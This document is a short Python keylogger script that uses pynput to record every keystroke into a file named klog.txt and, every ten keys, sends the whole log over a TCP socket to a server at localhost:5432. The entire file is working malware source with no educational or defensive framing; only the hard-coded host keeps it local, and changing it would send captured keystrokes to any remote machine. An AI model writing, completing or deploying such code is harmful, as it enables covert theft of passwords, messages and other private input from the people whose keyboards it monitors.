import asyncio

from pynput.keyboard import Key, Listener
from datetime import datetime
import tqdm
import socket
import os

counter = 0
filename = "klog.txt"

def on_press(key):

    with open(filename,'a+') as f:
        f.write(str(key))
        f.close()

    global counter
    counter += 1
 
    if counter % 10 == 0:
        asyncio.run(SendDataToServer())

async def SendDataToServer():
    SEPARATOR = "<SEPARATOR>"
    BUFFER_SIZE = 4096 # send 4096 bytes each time step
    PORT = 5432
    HOST = 'localhost'

    filesize = os.path.getsize(filename)

    try:
        s = socket.socket()

        print(f"[+] Connecting to {HOST}:{PORT}")
        s.connect((HOST, PORT))
        print("[+] Connected.")

        # send the filename and filesize
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())

        # start sending the file
        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in 
                # busy networks
                s.sendall(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
        
        # close the socket
        s.close()
    except:
        # close the socket
        print('[+] Server is down.')
        s.close()

with Listener(on_press=on_press) as listener:
    listener.join()